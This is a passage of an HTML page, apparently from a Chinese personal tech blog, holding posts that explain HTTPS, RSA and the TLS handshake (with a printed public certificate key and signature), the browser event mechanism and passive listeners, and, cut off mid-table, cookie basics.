+<h3 id="SSL-amp-TLS"><a href="#SSL-amp-TLS" class="headerlink" title="SSL &amp; TLS"></a>SSL &amp; TLS</h3><p><img src="http://sean-images.qiniudn.com/tls-ssl-_tcp-ip_protocol.png" alt=""></p>
+<ul>
+<li><p><strong>SSL</strong>：（Secure Socket Layer，安全套接字层），为Netscape所研发，用以保障在Internet上数据传输之安全，利用数据加密(Encryption)技术，可确保数据在网络上之传输过程中不会被截取。当前版本为3.0。它已被广泛地用于Web浏览器与服务器之间的身份认证和加密数据传输。<br>SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
+</li>
+<li><p><strong>TLS</strong>：(Transport Layer Security，传输层安全协议)，用于两个应用程序之间提供保密性和数据完整性。<br>TLS 1.0是IETF（Internet Engineering Task Force，Internet工程任务组）制定的一种新的协议，它建立在SSL 3.0协议规范之上，是SSL 3.0的后续版本，可以理解为SSL 3.1，它是写入了 RFC 的。该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。较低的层为 TLS 记录协议，位于某个可靠的传输协议（例如 TCP）上面。</p>
+</li>
+</ul>
+<h3 id="对称加密-amp-非对称加密"><a href="#对称加密-amp-非对称加密" class="headerlink" title="对称加密 &amp; 非对称加密"></a>对称加密 &amp; 非对称加密</h3><p>关于这两种加密方法，Medium 上有一篇文章 <a href="https://medium.freecodecamp.org/https-explained-with-carrier-pigeons-7029d2193351" target="_blank" rel="noopener">HTTPS explained with carrier pigeons</a> 用了通俗的方法，解释得挺清楚的。前端早读课也分享过<a href="https://mp.weixin.qq.com/s/GanPiEkJFJqURZ7HNUMXSQ" target="_blank" rel="noopener">翻译版</a></p>
+<p>简单讲，对称加密（symmetric key cryptography），任一方都知道如何加密，如何解密。但是对称加密的前提是双方已经确认通信。如果要建立通信，不能把加密方法或密钥发送出去（可以被拦截，那加密就没什么意义了），也不能发送“加密”的密钥（对方不知道用什么方法解密）。所以接下来要解决的问题，就是怎么安全地把加密方法或密钥，发送给对方，避免中间人攻击（Man in the Middle Attack）。</p>
+<p>非对称加密（ asymmetric key cryptography），一方可以加密信息，但是不能解密别人的已加密信息。比如 client 要向 server 发送一段 message ，大概过程如下：</p>
+<p><img src="https.png" alt="asymmetric key cryptography"></p>
+<p>这就是非对称加密的过程，加密方可以加密 message （lock the box），但是不能解密（open a locked box）。这里的 box 就是公钥（public key），打开 box 的 key 就是私钥（private key）</p>
+<h3 id="可信任的-box"><a href="#可信任的-box" class="headerlink" title="可信任的 box"></a>可信任的 box</h3><p>上面这种方法还有一个问题，client 怎么确定，它接收到的 public key 是 server 发给它的。如果有一个中间人拦截了这个 public key ，替换成一个 evil key，再转发给 client。client 和 server 的对话安全，还是不可保证。</p>
+<p>这时候需要一个第三方来告诉 client，刚刚接收到的 public key 是合法的。这就是 Certification Authority 机制。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/460263-60c696bb9f5f8715.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800/format/webp" alt="CA"></p>
+<h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>RSA 算法的核心：对一个大数进行因式分解极难。</p>
+<h4 id="数学背景"><a href="#数学背景" class="headerlink" title="数学背景"></a>数学背景</h4><ol>
+<li>欧拉函数</li>
+</ol>
+<blockquote>
+<p>欧拉函数 φ(n) 是小于或等于 n 的正整数中与 n 互质的数的数目。</p>
+</blockquote>
+<p>例如 <code>φ(8) = 4</code> ，因为 1,3,5,7 均和 8 互质。</p>
+<blockquote>
+<p>如果p，q是质数，N = p * q，那么<br>$$φ(N) = φ(p)φ(q) = (p-1)(q-1)$$</p>
+</blockquote>
+<p>简单证明：</p>
+<p>1) φ(1) = 1，小于等于 1 且于 1 互质的数只有 1 。</p>
+<p>2) 如果 p 是质数，p &gt; 1，φ(p) = p - 1 。比如 5 是质数，那么 φ(5) = 4，因为 1,2,3,4 都与 5 互质。要证明这一点可以用反证法。从定义上，有 φ(p) ≤ p。</p>
+<p>1° φ(p) ≠ p，因为 p 与 p 不互质，这样就剩下 p - 1 个数。</p>
+<p>2° 假设剩下的 p - 1 中任取一个数 r ，r 与 p 不互质 。也就是存在最大公约数 s ，s ≠ 1 ，使得 ms = r, ns = p。</p>
+<p>3° ns = p 与 p 是质数这一前提矛盾，假设不成立。</p>
+<p>3) 若m,n互质，则 φ(mn) = φ(m)φ(n) 【证明未给出】</p>
+<p>4) 如果n是a的k次幂，则 φ(n) = φ(a^k) = a^k - a^(k-1) = (a-1)a^(k-1) 【证明未给出】</p>
+<ol start="2">
+<li>模反元素</li>
+</ol>
+<blockquote>
+<p>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。<br>$$a * b = 1 mod(n)$$</p>
+</blockquote>
+<ol start="3">
+<li>欧拉定理</li>
+</ol>
+<blockquote>
+<p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：<br>$$a^φ(n) = 1(mod n)$$</p>
+</blockquote>
+<p>由此可得：a 的 φ(n - 1) 次方肯定是a关于n的模反元素。</p>
+<p>欧拉定理就可以用来证明模反元素必然存在。</p>
+<p>由模反元素的定义和欧拉定理我们知道，a 的 φ(n) 次方减去 1 ，可以被 n 整除。比如，3 和 5 互质，而 5 的欧拉函数 φ(5) 等于 4 ，所以 3 的 4 次方(81)减去 1 ，可以被 5 整除（80/5=16）。</p>
+<p>小费马定理：</p>
+<blockquote>
+<p>假设正整数a与质数p互质，因为质数 p 的 φ(p) 等于 p - 1，则欧拉定理可以写成<br>a^(p-1) = 1 mod(p)<br>这其实是欧拉定理的一个特例。</p>
+</blockquote>
+<h4 id="公钥密钥生成"><a href="#公钥密钥生成" class="headerlink" title="公钥密钥生成"></a>公钥密钥生成</h4><ol>
+<li>寻找两个不相等的大质数</li>
+</ol>
+<p>质数p，q，满足：</p>
+<p>$$p ≠ q$$<br>$$N = p * q$$</p>
+<ol start="2">
+<li>根据欧拉函数获取 r</li>
+</ol>
+<p>$$r = φ(N) = φ(p)φ(q) = (p-1)(q-1)$$</p>
+<ol start="3">
+<li>选择一个小于 r 并与 r 互质的数 e，求得 e 关于 r 的模反元素，记为 d</li>
+</ol>
+<p>$$e * d = 1 mod(r)$$</p>
+<p>e 通常取 65537 。</p>
+<ol start="4">
+<li>销毁 p 和 q</li>
+</ol>
+<p>公钥：(N, e)<br>私钥：(N, d)</p>
+<p>N 和 e 会公开使用，所以“根据 N 和 e 破解出 d”的难度，决定了 RSA 的加密强度。</p>
+<p>想解出 d ，d 是 e 关于 r 的模反元素，所以要解出 r 。</p>
+<p>r = φ(N) = φ(p)φ(q) = (p-1)(q-1) ，所以需要解出 p ，q 。</p>
+<p>N = p * q，从公开的数据中我们只知道 N 和 e ，所以问题的关键就是对 N 做因式分解能不能得出 p 和 q 。</p>
+<h3 id="HTTPS-完整过程"><a href="#HTTPS-完整过程" class="headerlink" title="HTTPS 完整过程"></a>HTTPS 完整过程</h3><p>tcp 抓包结果如下：</p>
+<p><img src="tcp.png" alt="tcp connection"></p>
+<h4 id="建立-tcp-链接"><a href="#建立-tcp-链接" class="headerlink" title="建立 tcp 链接"></a>建立 tcp 链接</h4><p>前三段 tcp 报文，并且很明显有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C ---- [SYN]       Seq=0       ---&gt; S</span><br><span class="line">C &lt;--- [SYN] [ACK] Seq=0 Ack=1 ---- S</span><br><span class="line">C ----       [ACK] Seq=1 Ack=1 ---&gt; S</span><br></pre></td></tr></table></figure>
+<p>这就是 tcp 三次握手。</p>
+<h4 id="Client-Hello"><a href="#Client-Hello" class="headerlink" title="Client Hello"></a>Client Hello</h4><ul>
+<li>TLS 版本</li>
+</ul>
+<p>使用的TLS版本是1.2，TLS有三个版本，1.0，1.1，1.2，1.2是最新的版本，https的加密就是靠的TLS安全传输层协议</p>
+<p><img src="TSLversion.png" alt="TSL version"></p>
+<ul>
+<li>客户端当前的时间和一个随机密码串，这个时间是距Unix元年(1970.1.1)的秒数</li>
+</ul>
+<p><img src="random.png" alt="random"></p>
+<ul>
+<li>sessionId，会话ID，第一次连接时为0，如果有sessionId，则可以恢复会话，而不用重复握手过程</li>
+</ul>
+<p><img src="sessionID.png" alt="sessionID"></p>
+<ul>
+<li>浏览器支持的加密组合方式：可以看到，浏览器一共支持 17 种加密组合方式，发给服务器，让服务器选一个。</li>
+</ul>
+<p><img src="cipher-suites.png" alt="cipher-suites"></p>
+<ul>
+<li>server 域名</li>
+</ul>
+<p><img src="server-name.png" alt="server name"></p>
+<p>域名是工作在应用层 http 里的，而握手是发生在 TLS ,还在传输层。在传输层里面就把域名信息告诉服务器，好让服务根据域名发送相应的证书。</p>
+<h4 id="Server-Hello"><a href="#Server-Hello" class="headerlink" title="Server Hello"></a>Server Hello</h4><p>服务器收到了Client Hello的信息后，就给浏览器发送了一个Server Hello的包，这个包里面有着跟Client Hello类似的消息</p>
+<ul>
+<li>时间、随机数等，注意服务器还发送了一个Session Id给浏览器</li>
+</ul>
+<p><img src="server-hello.png" alt="server hello"></p>
+<ul>
+<li>服务器选中的加密方式</li>
+</ul>
+<p><img src="cipher-suite.png" alt="cipher suite"></p>
+<ul>
+<li>Certificate 证书</li>
+</ul>
+<p><img src="certificate.png" alt="Certificate"></p>
+<p>可以看到 server 发送了两份证书</p>
+<p><img src="ca.png" alt="CA"></p>
+<p>在浏览器中可以查看这些证书的关系。</p>
+<p><img src="ca-detail.png" alt="ca detail"></p>
+<p>GlobalSign Root CA 是系统根证书，现代网络操作系统都会内置一份可信的根证书列表（Firefox 的根证书列表独立于操作系统之外）。<br>所谓“可信的根证书列表”是指操作系统开发商通过严格地审核，将安全可靠、可被信任的 CA 机构纳入白名单，并将这些权威可信 CA 的根证书预安装到操作系统中。</p>
+<p>浏览器中可以查看根证书</p>
+<p><img src="root-ca.png" alt="root ca"></p>
+<p><code>*.juejin.im</code> 的证书是依赖于 <code>GlobalSign Domain</code> 的证书，换句话说，<code>GlobalSign Domain</code> 的证书为 <code>*.juejin.im</code> 的证书做担保，而根证书 <code>GlobalSign Root</code> 为 <code>GlobalSign Domain</code> 做担保，形成一条依赖链。明白这点很重要，从技术的角度上来说，<code>GlobalSign</code> 为 <code>*.juejin.im</code> 的证书做签名，只要签名验证正确就说明 <code>*.juejin.im</code> 的证书是合法的。</p>
+<p><code>*.juejin.im</code> 证书里面会指明它的上一级证书</p>
+<p><img src="ca-relation.png" alt="ca relation"></p>
+<p>现在来看下一个证书里面具体有什么内容。</p>
+<p>除了上面提到的签名外，每个证书还包含签名的算法，和被签名的证书 tbsCertificate(to be signed Certificate)三部分：</p>
+<p><img src="signed-ca.png" alt="signed ca"></p>
+<p>tbsCertificate 展开可以看到证书所支持的域名、有效期</p>
+<p><img src="support-domain.png" alt="supported domain"></p>
+<p><img src="validity.png" alt="validity"></p>
+<p>还有证书的公钥</p>
+<p><img src="pubkey.png" alt="pubkey"></p>
+<p>把公钥拷贝出来，是一个 270 字节的数字。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String publicKey = <span class="string">"3082010a0282010100a33da1f26ef4586d7b5da8be5cfbe5b48b8cd2d00df6960b640fab2d959a2cac1ae4022756c1f70d2701de0b133039c29793cf0c21382e18f1d6720f1d57c0261ee07a0afeb508e83896e1ce3e98d9ccc636e2b1627be11b258b6e5c1cc8c4721dbf2c6672cc8e2c23da576b6ecbf3f93227e756a7b195f00e329d043e1ba84af1a259e69c06a80a050d1b5649e6e52a93c4d418f43361282883591ae90019ea933054799c330d046fde030260dc815bee0b292b5c2317b6eff77e2d37512101c0bde04b898aee85fb7ce73f93728ac8c506f785927073c2b18d7d479664bb95f2db970e984afdd0df70f6f7d1da3953672e804a1fd0354ddbf6063912dba9950203010001"</span>;</span><br></pre></td></tr></table></figure>
+<p>黑色部分是标志位，公钥可以拆为 N 和 e 两部分。</p>
+<p><img src="publicKey.png" alt="public key"></p>
+<p>N 是一个十六进制的 512 位数字，换算成二进制有 2048 位。普通的证书是1024位，2048位是一个很高安全级别，换算成10进制是617位，如果你能够将这个617位的大整数拆成两个质数相乘，就可以推导出密钥（但这是不可能的）。</p>
+<p>e 为 65537 ，证书通常取的幂指数都为这个数字。</p>
+<p>证书里面可以知道证书的加密算法为RSA + SHA256，SHA是一种哈希算法，可用来检验证书是否被篡改过：</p>
+<p><img src="encryptedCA.png" alt="encrypted CA"></p>
+<p>将 encrypted 的值拷贝出来，就是证书的签名</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String signature = <span class="string">"005bd43c64a8901c858bc8caf78c7eb75df6b71c11a51fff9afa1f1c8c1b7c4e12f70f1c02abaed13db0d791c105f620bf7b5d62f4cc29626acc941ba7088acad006c076be34afceb600107d3ebd997304d4d652143aba3161e5de12658bc3bec017cea58dec7993e678ef018f5d4709c5090db811f29da51baf28db97f04d6df2ef9893682128b0d3c74bf1c3531f474251cfcbb4a7c3832bec9c4e9719d58153f6547238f188c6f59af020b79d55a8722bdb64c5a0453be72a264d199fa6b35af72c88ff5cff7529f53d785afb1d343e782960af396f89201452c2725992d231e2277029eb12bcaaf4ccfd625fb0e2026bfc3946581690bb56ca6ca7864981"</span>;</span><br></pre></td></tr></table></figure>
+<p>这个签名是一个 256 个字节的数字，它是 GlobalSign Domain 用它的密钥对 tbsCertificate 做的签名，可以用 GlobalSign Domain 的公钥进行解密。</p>
+<p>解出来的结果可以提取一段 SHA 哈希，记为 sha1，</p>
+<p>对 tbsCertificate 做 SHA 哈希，得到 sha2，</p>
+<p>只有 sha1 == sha2 ，我们认为证书没有被篡改。</p>
+<p>中间人有没有可能既篡改了证书，还能保证哈希值是对的？首先不同的字符串被SHA256哈希后的值是一样的概率比较小，同时由于密钥和公钥是一一配对的，（签名是用证书的私钥加密的，可以用证书的公钥解密它。但是没有这个必要，因为最后要用私钥再把它加密回去，而我们拿不到私钥）所以中间人只能把公钥改成它的公钥，这个公钥是一个p * q 的整数，所以他必须得满足两个条件，一个是要更改成一个有意义的公钥，另一个是整个证书的内容被哈希后的值和没改前是一样的，满足这两个条件就相当困难了。</p>
+<h4 id="Server-Key-Exchange-和-Client-Key-Exchange"><a href="#Server-Key-Exchange-和-Client-Key-Exchange" class="headerlink" title="Server Key Exchange 和 Client Key Exchange"></a>Server Key Exchange 和 Client Key Exchange</h4><p>看抓包结果，Server Key Exchange 和 Certificate 是在同一段报文里面的。</p>
+<p>客户端确认证书合法之后，接收 server 的公钥，并把自己的公钥发送给 server 。</p>
+<p>这次交换的公钥，要比证书的公钥短很多，只有 97 字节。同时加密的算法也不是 RSA （RSA的计算量太大）所以RSA是用来验证身份然后交换密钥的，并不是用来加密数据的，因为它计算量太大。加密数据是用的ECDHE生成的密钥和公钥。</p>
+<p><img src="public-key-length.png" alt="public key length"></p>
+<p>同样地，浏览器结合服务器发给它的随机密码(Server Hello)，生成它自己的主密钥，然后发送公钥发给服务器</p>
+<p>双方交换密钥之后，浏览器给服务器发了一个明文的 Change Cipher Spec 的包，告诉服务器我已经准备好了，可以开始传输数据了,同样地，服务器也会给浏览器发一个Change Cipher Spec的包：</p>
+<p><img src="change-ciper-spec.png" alt="change ciper spec"></p>
+<p>实际上，这些包并不是一个个单独发的，client 发送 Client Key Exchange 的时候，连带把 Change Cipher Spec 的包和 Encrypted Handshake Message 的请求一并发送出去，server 的响应也是类似的。这样可以节约几次 RTT 时间。</p>
+<p>浏览器给服务回了个ACK，然后就开始传输数据：</p>
+<p>数据传输过程，是对称加密的，那为什么还要交换公钥？公钥的作用是加密“对称加密的钥匙”。</p>
+<p>服务器选择的数据传输加密方式为AES，AES是一种高效的加密方式，它会使用主密钥（服务器的私钥）生成另外一把密钥。</p>
+<blockquote>
+<p>参考</p>
+<p><a href="https://segmentfault.com/a/1190000002554673#articleHeader0" target="_blank" rel="noopener">SSL/TLS原理详解</a></p>
+<p><a href="https://juejin.im/post/5a76d7e3f265da4e752770a3" target="_blank" rel="noopener">RSA 算法详解</a></p>
+<p><a href="https://fed.renren.com/2017/02/03/https/" target="_blank" rel="noopener">https连接的前几毫秒发生了什么</a></p>
+</blockquote>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/20/http-and-https/" data-id="ckbs697pt000xrhjcqysaxdaz" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-browser-dom-event" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/20/browser-dom-event/">浏览器事件机制</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/20/browser-dom-event/" class="article-date">
+  <time datetime="2018-11-20T15:00:51.000Z" itemprop="datePublished">2018-11-20</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/浏览器/">浏览器</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>要知道浏览器是怎么接收输入（滚动，鼠标移动，input 事件，对浏览器来说都是输入），需要明白在页面的呈现的哪个步骤，对事件作出响应。</p>
+<p>简单讲一下页面呈现步骤：</p>
+<p>浏览器的 render process 构建了 DOM Tree，CCSOM tree ，它知道文档的结构以及每个节点的样式，但仅有这些信息不足以渲染一个页面。这时需要 layout process 去定位每个节点的几何信息（形状，位置），由 render process 提供的 DOM tree 和 CSSOM tree ，构建 layout tree （或者说 render tree）。下一步交给 painting process ，主线程遍历 layout tree ，创建画板记录（paint records）。画板记录就像是 painting process 中的一本笔记，记录着类似“先画背景，然后是文字，然后是矩形”的东西。</p>
+<p>现在浏览器知道了文档的结构，节点的样式，页面的几何信息，还有绘制顺序。把这些信息转化为屏幕上的像素的过程，叫做光栅化。</p>
+<p>比较傻瓜的方法是在浏览器的视口（viewport）里面做部分光栅化。如果用户滚动页面，把这个光栅往下挪，填充空缺的部分。Chrome 刚发布的那会就是用这种方式做光栅化的，现代浏览器则会启用一个更复杂的进程：compositing（合成）。</p>
+<p>compositing 进程把页面分为多个图层（layer），分隔地将它们光栅化，最后在合成器线程（compositor thread）中组成页面。图层可能很大，比如占据整个页面的长度，所以合成器线程会把它们分成一个个小瓦片，发送到多个光栅线程（raster threads）。光栅线程将每个瓦片光栅化（像素化），并储存在 GPU 内存中。</p>
+<blockquote>
+<p>在 chrome devTools 里面的 performance 可以看到，渲染一个页面的时候有多个 raster threads 参与。</p>
+</blockquote>
+<p>以上大概就是页面 layout –&gt; paint –&gt; composite 的过程，更多细节可以看 google developers 的文章 <a href="https://developers.google.com/web/updates/2018/09/inside-browser-part3" target="_blank" rel="noopener"><br>Inside look at modern web browser (part 3)</a></p>
+<hr>
+<p>好了，终于可以讲浏览器对输入的处理了：</p>
+<p>第一个接收到用户手势（触屏，点击，滑动…）的是浏览器进程（UI 线程？），浏览器进程会把这个手势的事件类型，坐标发送到渲染进程。渲染进程找到事件目标，执行对应的监听。</p>
+<p>执行 JavaScript 是主线程（main thread）的主要工作，当一个页面经由合成器线程合成后，合成器线程会把绑定了监听事件的区域标记为 “Non-Fast Scrollable Region” 。如果注册的事件在这个区域上触发，合成器线程确保把事件发送到主线程。如果事件发生在这个区域外，合成器线程继续合成新的帧，而不用等待主线程。</p>
+<p>我们知道事件代理模式。事件可以冒泡，那么可以在最最底部的元素上绑定事件，比如如下代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'touchstart'</span>,  event =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.target === area) &#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>
+<p>看起来只需要注册一次事件，就可以代理所有发生在它子代上面的事件，似乎很诱人。但是在浏览器的角度，整个页面被标记为 non-fast scrollable region ，这意味着，尽管你的应用可能不在意页面一些区域的输入，合成器线程还是需要和主线程通信，每次都要等待输入。所以合成器的“顺畅滚动“能力用不上了。</p>
+<p>可以向事件监听传入参数 <code>passive: true</code> ，这告诉浏览器：你还是想要在主线程上监听事件，但是合成器线程仍继续合成帧。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'touchstart'</span>,  event =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.target === area) &#123;</span><br><span class="line">        event.preventDefault()</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;, &#123;<span class="attr">passive</span>: <span class="literal">true</span>&#125; );</span><br></pre></td></tr></table></figure>
+<h3 id="事件触发的三个阶段"><a href="#事件触发的三个阶段" class="headerlink" title="事件触发的三个阶段"></a>事件触发的三个阶段</h3><p>本节部分转载自： <a href="https://yuchengkai.cn/docs/zh/frontend/browser.html#%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">https://yuchengkai.cn/docs/zh/frontend/browser.html#%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6</a></p>
+<p>事件触发有三个阶段</p>
+<ul>
+<li>window 往事件触发处传播，遇到注册的捕获事件会触发</li>
+<li>传播到事件触发处时触发注册的事件</li>
+<li>从事件触发处往 window 传播，遇到注册的冒泡事件会触发</li>
+</ul>
+<p>事件触发一般按照上面的顺序，但是有例外：如果为同一个元素同时注册了捕获事件和冒泡事件，事件会按照注册的顺序触发。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下会先打印冒泡然后是捕获</span></span><br><span class="line">node.addEventListener(<span class="string">'click'</span>,(event) =&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'冒泡'</span>)</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br><span class="line">node.addEventListener(<span class="string">'click'</span>,(event) =&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'捕获 '</span>)</span><br><span class="line">&#125;,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="注册事件"><a href="#注册事件" class="headerlink" title="注册事件"></a>注册事件</h3><p>一般用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener" target="_blank" rel="noopener">EventTarget.addEventListener()</a>，当然 ie 老古董自行用 <code>onEvent = function(){ ... }</code> 方式。</p>
+<p>addEventListener 函数的第三个参数可以是布尔值，也可以是对象。对于布尔值 useCapture 参数来说，该参数默认值为 false 。useCapture 决定了注册的事件是捕获事件还是冒泡事件。缺省情况下注册冒泡事件。</p>
+<p>对于对象参数来说，可以使用以下几个属性</p>
+<ul>
+<li>capture，布尔值，和 useCapture 作用一样</li>
+<li>once，布尔值，值为 true 表示该回调只会调用一次，调用后会移除监听</li>
+<li>passive，布尔值，表示永远不会调用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault" target="_blank" rel="noopener">preventDefault</a></li>
+</ul>
+<p>capture 和 once 都比较好理解。下面讲一下 preventDefault ：</p>
+<p>preventDefault 告诉浏览器：如果此事件没有需要显式处理，那么它默认的动作也不要做（因为默认是要做的）。此事件还是继续传播，除非碰到事件侦听器调用stopPropagation() 或stopImmediatePropagation()，才停止传播。</p>
+<p>这里我们可以看到 preventDefault 的作用：开发者可以在监听 touch 和 wheel 事件时指定 <code>{passive:true}</code> 来表明他们不会调用preventDefault。也就是说，默认的滚动事件还是要做的，而且永远不会被禁用，从而获得更好的滚动性能。归根结底是合成器线程无需等待主线程，继续合成帧。</p>
+<p>更多阅读移步 <a href="https://github.com/WICG/EventListenerOptions/blob/gh-pages/explainer.md" target="_blank" rel="noopener">Passive event listeners</a> <a href="https://futu.im/posts/2017-06-06-passive-event-listeners/" target="_blank" rel="noopener">翻译版</a></p>
+<h3 id="事件代理"><a href="#事件代理" class="headerlink" title="事件代理"></a>事件代理</h3><p>如果一个节点中的子节点是动态生成的，那么子节点需要注册事件的话应该注册在父节点上</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=<span class="string">"ul"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">3</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;4&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">5</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">'##ul'</span>)</span><br><span class="line">    ul.addEventListener(<span class="string">'click'</span>, (event) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event.target);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>事件代理的方式相对于直接给目标注册事件来说，有以下优点</p>
+<ul>
+<li>节省内存</li>
+<li>不需要给子节点注销事件</li>
+</ul>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/20/browser-dom-event/" data-id="ckbs697p80005rhjcc5e6p2qy" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/优化/">优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/浏览器/">浏览器</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-cookie-base-concept" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/20/cookie-base-concept/">cookie 基础概念</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/20/cookie-base-concept/" class="article-date">
+  <time datetime="2018-11-20T14:58:46.000Z" itemprop="datePublished">2018-11-20</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/网络/">网络</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>我们常说的 cookie ，也称为 HTTP Cookie ，它其实是 HTTP 头部中的一段信息，记录客户端和服务器端的交互中的一些信息。它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>
+<h3 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h3><p><a href="https://tools.ietf.org/html/rfc6265#section-4.1" target="_blank" rel="noopener">RFC 6265</a> 规定，服务端可以在 HTTP 响应头部设置 cookie。格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:&lt;cookie&gt;</span><br></pre></td></tr></table></figure>
+<p>cookie 以一对键-值对开始，后面跟着若干属性-值对。属性的详细信息查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener">MDN Set-Cookie</a>。</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>value</th>
+<th>detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Expires</td>
+<td>符合 HTTP-date 规范的时间戳</td>
+<td>若不设置，说明这是一个会话期 cookie</td>
+</tr>
+<tr>
+<td>Max-Age</td>
